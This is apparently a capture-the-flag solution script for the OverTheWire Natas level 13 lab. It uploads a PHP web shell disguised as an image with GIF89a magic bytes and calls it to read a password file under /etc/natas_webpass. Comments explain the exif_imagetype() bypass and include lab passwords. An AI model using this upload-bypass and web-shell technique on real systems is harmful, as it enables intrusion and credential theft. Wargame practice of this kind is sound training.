#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

url = (
    "http://%s.natas.labs.overthewire.org/upload/hmo1o65c99.php?cmd=cat /etc/natas_webpass/natas14"
    % username
)
session = requests.Session()

files = {"uploadedfile": open("/home/bigfish/Downloads/natas/natas13.php", "rb")}
data = {"filename": "natas13.php", "MAX_FILE_SIZE": "1000"}
# for the main page
response = session.post(url, files=files, data=data, auth=(username, password))

# for the /index-source.html page
# response = session.get(url, auth=(username, password))

content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup)
# print content

# this is all about uploading a file actually this file is a photo.jpg
# or it should be so. thus the goal here is to upload a file that first
# bypass the filters that checks if the uploaded file is a photo or not
# then this file should be able to make remote code execution on the server
# side, so you can reveal the password for natas14
#
# also we can see the /index-source.html for better seeing the filter
# it looks like that after we upload the file, the server generates a random
# string name for that file, then it gives you the path for that file
# another filter that has been added to this level is a php function: exif_imagetype()
# luckly, this function checks the first four bytes of the file to check its type
# so, we need some magical charcters that defines what a jpeg image is from that
# exif_imagetype() function prespective
# those chars are like: GIF89a and should be put even before the start of the php script
#
# so, a file that can give us a revers_php_shell on the server which is natas12.php
# after uploading the file, it gives us a url to upload/{ 02cmi7t6qp.php }
# so let's go there and see
# we might got an error as we can't execute a blank command
# and the solution is to provide ?cmd={ cat /etc/natas_webpass/natas13 }
# and here's is the password for natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
